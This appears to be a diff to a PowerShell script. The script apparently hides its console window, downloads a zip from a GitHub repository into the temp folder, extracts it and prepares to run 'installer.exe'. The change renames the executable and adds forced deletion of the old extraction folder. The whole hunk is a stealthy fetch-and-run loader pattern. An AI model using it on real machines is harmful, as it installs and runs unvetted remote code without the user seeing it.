@@ -16,12 +16,17 @@ $consolePtr = [Win32]::GetConsoleWindow()
 $url = "https://github.com/pisusaoonasalex/msgbox/raw/refs/heads/main/installer.zip" # Replace with your zip file URL
 $zipPath = Join-Path $env:TEMP 'downloaded.zip'
 $extractPath = Join-Path $env:TEMP 'extracted'
-$exeName = "msgbox.exe" # Name of the executable inside the zip
+$exeName = "installer.exe" # Name of the executable inside the zip
 
 try {
     # Download the zip file
     $webClient = New-Object System.Net.WebClient
     $webClient.DownloadFile($url, $zipPath)
+
+    # Check if the extraction path exists, and clear it if necessary
+    if (Test-Path $extractPath) {
+        Remove-Item -Path $extractPath -Recurse -Force
+    }
 
     # Extract the zip file
     Add-Type -AssemblyName System.IO.Compression.FileSystem
